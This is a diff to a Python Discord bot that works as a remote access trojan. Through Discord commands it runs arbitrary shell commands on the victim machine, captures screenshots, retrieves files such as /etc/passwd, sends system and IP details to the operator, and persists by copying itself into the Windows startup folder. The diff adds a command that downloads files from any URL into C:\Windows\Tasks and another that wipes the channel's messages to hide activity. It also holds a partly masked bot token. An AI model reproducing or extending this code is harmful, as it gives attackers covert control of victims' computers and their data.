@@ -1,6 +1,18 @@
 import os
-import shutil
 import sys
+
+# Get the directory of the current script
+script_dir = os.path.dirname(os.path.abspath(__file__))
+
+# Path to the virtual environment
+venv_path = os.path.join(script_dir, 'venv')
+
+# add site-packages to the sys.path
+site_packages = os.path.join(venv_path, 'Lib', 'site-packages')
+sys.path.insert(0, site_packages)
+
+import time
+import shutil
 import pyautogui
 import subprocess
 import random
@@ -12,8 +24,8 @@ import getpass
 import requests
 from discord.ext import commands
 
-allowed_user_ids = ['111111111111111111']  # Allowed User ID
-channel_id = 11111111111111111111  # Allowed Channel ID
+allowed_user_ids = ['27111111111111111111359746']
+channel_id = 125111111111111177558671
 
 intents = discord.Intents.default()
 intents.message_content = True
@@ -24,7 +36,6 @@ bot = commands.Bot(command_prefix="!", intents=intents)
 def get_local_ipv4_addresses():
     local_ipv4_addresses = []
     try:
-        # Get all network interfaces and their addresses
         if platform.system() == 'Windows':
             for interface, addrs in psutil.net_if_addrs().items():
                 for addr in addrs:
@@ -48,7 +59,6 @@ def take_screenshot(filename='screenshot.png'):
 
 def get_system_info():
     system_info = {'platform': platform.system(), 'username': getpass.getuser(), 'machine_name': socket.gethostname()}
-
     try:
         public_ip = requests.get('https://ifconfig.co/ip').text.strip()
         system_info['public_ip'] = public_ip
@@ -59,18 +69,15 @@ def get_system_info():
     system_info['architecture'] = platform.architecture()
     system_info['machine'] = platform.machine()
 
-    # Memory information
     mem = psutil.virtual_memory()
-    system_info['total_memory'] = mem.total / (1024 ** 3)  # Convert bytes to GB
-    system_info['available_memory'] = mem.available / (1024 ** 3)  # Convert bytes to GB
+    system_info['total_memory'] = mem.total / (1024 ** 3)
+    system_info['available_memory'] = mem.available / (1024 ** 3)
 
-    # Disk information
     disk = psutil.disk_usage('/')
-    system_info['total_disk'] = disk.total / (1024 ** 3)  # Convert bytes to GB
-    system_info['used_disk'] = disk.used / (1024 ** 3)  # Convert bytes to GB
-    system_info['free_disk'] = disk.free / (1024 ** 3)  # Convert bytes to GB
+    system_info['total_disk'] = disk.total / (1024 ** 3)
+    system_info['used_disk'] = disk.used / (1024 ** 3)
+    system_info['free_disk'] = disk.free / (1024 ** 3)
 
-    # Local IPv4 addresses
     system_info['local_ipv4_addresses'] = get_local_ipv4_addresses()
 
     formatted_string = ""
@@ -85,8 +92,34 @@ def get_system_info():
     return formatted_string
 
 
+@bot.command()
+async def download_file(ctx, url: str = None, *, save_path: str = None):
+    if url is None:
+    
+        embed = discord.Embed(title=f"{getpass.getuser()}@{socket.gethostname()}", description=f'```URL is missing. Please provide a URL to download the file. You can also specify a download location using the following syntax:\n"!download_file <url> [save_path]"```')
+        await ctx.send(embed=embed)
+        return
+
+    if save_path is None:
+        save_path = r'C:\Windows\Tasks'
+    
+    # Ensure the save path directory exists
+    os.makedirs(save_path, exist_ok=True)
+    
+    response = requests.get(url)
+    if response.status_code == 200:
+        filename = url.split("/")[-1]
+        full_path = os.path.join(save_path, filename)
+        with open(full_path, 'wb') as f:
+            f.write(response.content)
+        await ctx.send(f"File downloaded to {full_path}")
+    else:
+        await ctx.send("Failed to download the file from the web.")
+
+
 async def send_msg(channel, title, msg):
-    embed = discord.Embed(title=title, description=msg, color=random.randint(0, 0xFFFFFF))
+    embed = discord.Embed(title=title, description=msg,
+                          color=random.randint(0, 0xFFFFFF))
     embed.set_thumbnail(url='https://th.bing.com/th/id/OIG4.k_5NdtV_0KGMvB3OGtd_?pid=ImgGn')
     await channel.send(embed=embed)
 
@@ -101,8 +134,6 @@ async def on_ready():
         screenshot_filename = take_screenshot()
         await channel.send(file=discord.File(screenshot_filename))
         os.remove(screenshot_filename)
-        # await channel.send(get_system_info())
-
 
 @bot.command()
 async def ping(ctx):
@@ -125,16 +156,22 @@ async def cmd(ctx, *, command):
                 f.write(result)
             try:
                 with open(write_file, 'rb') as file:
-                    await ctx.send(file=discord.File(file, write_file))
+                    embed = discord.Embed(title=f"{getpass.getuser()}@{socket.gethostname()}", description=f'Command: {command}')
+                    await ctx.send(embed=embed, file=discord.File(file, write_file))
                 os.remove(write_file)
             except FileNotFoundError:
-                await ctx.send("File not found.")
+                embed = discord.Embed(title=f"{getpass.getuser()}@{socket.gethostname()}", description=f'Command: {command}')
+                embed.add_field(name="Output:", value=f"```File not found.```", inline=False)    
+                await ctx.send(embed=embed)
         elif len(result) == 0:
-            await ctx.send(
-                '```No output was generated by the command, suggesting that it likely executed an interactive '
-                'process.```')
+            embed = discord.Embed(title=f"{getpass.getuser()}@{socket.gethostname()}", description=f'Command: {command}')
+            embed.add_field(name="Output:", value=f"```No output was generated by the command, suggesting that it likely executed an interactive Process```", inline=False)  
+            await ctx.send(embed=embed)
         else:
-            await ctx.send(f'```{result}```')
+            embed = discord.Embed(title=f"{getpass.getuser()}@{socket.gethostname()}", description=f'Command: {command}')
+            embed.add_field(name="Output:", value=f"```{result}```", inline=False)            
+            await ctx.send(embed=embed)
+                
     except subprocess.CalledProcessError as e:
         await ctx.send(f'Command failed with return code: {e.returncode}: ```{e.output}```')
 
@@ -150,8 +187,22 @@ async def screenshot(ctx):
 async def helpme(ctx):
     string = (f'```!cmd - run commands (!cmd whoami)\n!screenshot - take screenshot\n'
               f'!get - get file from system (!get /etc/passwd)\n'
-              f'!persist - copy the script to user startup folder (Windows)\n!ping```')
+              f'!persist - copy the script to user startup folder (Windows)\n'
+              f'!ping - get pinged back from host\n'
+              f'!delete_all - delete all messages in channel\n'
+              f'!download_file - downloads a file from the web - example: !download_file URL path(default is C:\Windows\Tasks)```')
     await ctx.send(string)
+
+@bot.command()
+async def delete_all(ctx):
+    channel = ctx.channel
+    await ctx.send("Deleting all messages...")
+    def check(msg):
+        return True
+
+    async for msg in channel.history(limit=None):
+        await msg.delete()
+        time.sleep(1 * 0.5)
 
 
 @bot.command()
@@ -180,6 +231,6 @@ async def persist(ctx):
             await ctx.send("Failed to copy the script to startup folder.")
     except Exception as e:
         await ctx.send(f"An error occurred: {e}")
+        
 
-
-bot.run('zzzzzzzzzzzzzzzzzzzzzzz.Qqqq-Q.xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx')  # Bot Token
+bot.run('MTIxxxxxxxxxxxxxxxxUwNzgzNw.GPtz0H.VV2WFnxxxxxxxxxxxxJiKd8vvI6TlI')
